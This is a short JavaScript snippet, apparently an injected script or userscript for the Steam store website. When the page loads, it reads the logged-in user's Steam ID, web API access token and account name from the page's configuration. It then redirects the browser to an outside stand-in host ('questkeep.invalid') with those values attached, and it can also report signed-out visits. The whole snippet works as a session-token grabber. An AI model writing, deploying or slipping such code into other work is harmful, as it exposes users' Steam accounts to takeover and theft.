(function () {
  if (location.hostname !== "store.steampowered.com") return;
  var reportSignedOut = REPORT_SIGNED_OUT;
  var target = "https://questkeep.invalid/steam-session";
  function read(el, name) {
    try { return JSON.parse(el.getAttribute(name) || "null"); } catch (e) { return null; }
  }
  function capture() {
    var el = document.getElementById("application_config");
    var user = el && read(el, "data-userinfo");
    var config = el && read(el, "data-store_user_config");
    if (user && user.logged_in && user.steamid && config && config.webapi_token) {
      var menu = document.getElementById("account_pulldown");
      var name = menu ? menu.textContent.trim() : "";
      location.href = target + "?steamid=" + encodeURIComponent(user.steamid) +
        "&token=" + encodeURIComponent(config.webapi_token) + "&name=" + encodeURIComponent(name);
    } else if (reportSignedOut) {
      setTimeout(function () { location.href = target + "?signedout=1"; }, 5000);
    }
  }
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", capture);
  } else {
    capture();
  }
})();
